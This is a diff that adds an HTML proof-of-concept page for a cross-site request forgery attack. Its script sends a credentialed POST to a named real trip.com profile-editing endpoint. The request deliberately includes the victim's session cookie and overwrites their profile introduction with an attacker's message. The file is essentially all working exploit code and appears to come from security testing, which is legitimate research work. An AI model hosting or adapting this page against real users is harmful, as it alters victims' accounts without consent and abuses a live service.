@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CORS / CSRF Proof of Concept</title>
+</head>
+<body>
+    <h2>Testing Cross-Origin State Change...</h2>
+    <p>Open the browser console (F12) to trace the CORS preflight handling and server response status.</p>
+
+    <script>
+        // Target endpoint configuration
+        const targetUrl = "https://in.trip.com/restapi/soa2/18066/editUserIntroduction";
+        
+        // Exact JSON payload structure mapped from your Caido request
+        const payloadData = {
+            "content": "Hi, you have been csrfed\n, yo",
+            "head": {
+                "cver": "1.0",
+                "cid": "",
+                "locale": "en-IN",
+                "currency": "BRL",
+                "extension": [
+                    {"name": "locale", "value": "en-IN"},
+                    {"name": "platform", "value": "Online"},
+                    {"name": "currency", "value": "BRL"},
+                    {"name": "clientIp", "value": "127.0.0.1"}
+                ]
+            }
+        };
+
+        // Configuration object for cross-origin tracking
+        const requestOptions = {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'x-ctx-locale': 'en-IN' // Custom tracking header required by the API path
+            },
+            body: JSON.stringify(payloadData),
+            // CRITICAL: Instructs Chrome to include the SameSite=None 'cticket' session cookie
+            credentials: 'include' 
+        };
+
+        // Execute the transmission loop
+        fetch(targetUrl, requestOptions)
+            .then(response => {
+                console.log(`[+] HTTP Status Received: ${response.status}`);
+                return response.json();
+            })
+            .then(data => {
+                console.log("[+] Server response parsed successfully:");
+                console.log(data);
+            })
+            .catch(error => {
+                console.error("[-] Request blocked or structural validation failure:", error);
+            });
+    </script>
+</body>
+</html>
